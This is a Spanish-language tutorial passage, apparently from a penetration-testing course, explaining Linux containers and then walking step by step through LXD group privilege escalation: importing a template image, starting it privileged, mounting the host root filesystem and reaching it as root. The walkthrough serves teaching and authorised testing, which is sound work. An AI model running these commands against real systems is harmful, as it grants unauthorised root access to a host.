# Containers
Los Containers operan a nivel del sistema operativo y las máquinas virtuales a nivel del hardware. Por lo tanto, los containers comparten un sistema operativo y aíslan los procesos de la aplicación del resto del sistema, mientras que la virtualización clásica permite que múltiples sistemas operativos se ejecuten simultáneamente en un solo sistema.

La aislamiento y la virtualización son esenciales porque ayudan a gestionar los recursos y aspectos de seguridad de la manera más eficiente posible. Por ejemplo, facilitan la monitorización para encontrar errores en el sistema que a menudo no tienen nada que ver con las aplicaciones desarrolladas recientemente. Otro ejemplo sería el aislamiento de procesos que generalmente requieren privilegios de root. Tal aplicación podría ser una aplicación web o una API que debe estar aislada del sistema host para evitar la escalación a bases de datos.

---

## Linux Containers

Linux Containers (`LXC`) es una técnica de virtualización a nivel del sistema operativo que permite que múltiples sistemas Linux se ejecuten en aislamiento unos de otros en un solo host, teniendo sus propios procesos pero compartiendo el kernel del sistema host. `LXC` es muy popular debido a su facilidad de uso y se ha convertido en una parte esencial de la seguridad de TI.

Por defecto, `LXC` consume menos recursos que una máquina virtual y tiene una interfaz estándar, lo que facilita la gestión de múltiples containers simultáneamente. Una plataforma con `LXC` incluso puede organizarse en múltiples nubes, proporcionando portabilidad y asegurando que las aplicaciones que se ejecutan correctamente en el sistema del desarrollador funcionarán en cualquier otro sistema. Además, grandes aplicaciones pueden ser iniciadas, detenidas o sus variables de entorno cambiadas a través de la interfaz del Linux container.

La facilidad de uso de `LXC` es su mayor ventaja en comparación con las técnicas de virtualización clásicas. Sin embargo, la enorme expansión de `LXC`, un ecosistema casi omnipresente y herramientas innovadoras, se deben principalmente a la plataforma Docker, que estableció los containers de Linux. Toda la configuración, desde la creación de plantillas de containers y su despliegue, la configuración del sistema operativo y el networking, hasta el despliegue de aplicaciones, sigue siendo la misma.

### Linux Daemon

Linux Daemon ([LXD](https://github.com/lxc/lxd)) es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un application container sino un system container. Antes de que podamos usar este servicio para escalar nuestros privilegios, debemos estar en el grupo `lxc` o `lxd`. Podemos averiguarlo con el siguiente comando:

```r
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

A partir de aquí, hay varias formas en las que podemos explotar `LXC`/`LXD`. Podemos crear nuestro propio container y transferirlo al sistema objetivo o usar un container existente. Desafortunadamente, los administradores a menudo usan plantillas que tienen poca o ninguna seguridad. Esta actitud tiene la consecuencia de que ya tenemos herramientas que podemos usar contra el sistema nosotros mismos.

```r
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Tales plantillas a menudo no tienen contraseñas, especialmente si son entornos de prueba simples. Estos deben ser rápidamente accesibles y fáciles de usar. El enfoque en la seguridad complicaría toda la iniciación, lo haría más difícil y, por lo tanto, lo ralentizaría considerablemente. Si tenemos un poco de suerte y hay un container así en el sistema, se puede explotar. Para esto, necesitamos importar este container como una imagen.

```r
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

Después de verificar que esta imagen se ha importado correctamente, podemos iniciar la imagen y configurarla especificando el flag `security.privileged` y la ruta root para el container. Este flag desactiva todas las funciones de aislamiento que nos permiten actuar en el host.

```r
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Una vez que hemos hecho eso, podemos iniciar el container e iniciar sesión en él. En el container, podemos ir a la ruta que especificamos para acceder al `resource` del sistema host como `root`.

```r
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```